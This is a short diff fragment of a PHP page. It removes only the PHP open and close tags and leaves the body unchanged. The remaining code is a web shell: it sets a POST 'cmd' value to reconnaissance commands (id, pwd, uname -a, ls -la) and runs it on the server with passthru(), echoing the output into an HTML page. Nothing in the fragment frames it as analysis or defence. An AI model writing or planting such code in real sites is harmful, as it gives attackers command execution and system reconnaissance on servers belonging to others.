@@ -1,4 +1,3 @@
-<?php
 echo "
 <html>
 <head>
@@ -15,4 +14,4 @@ $_POST['cmd']="id;pwd;uname -a;ls -la";
 echo "".passthru($_POST['cmd'])."</pre>
 </body>
 </html>";
-?>
+
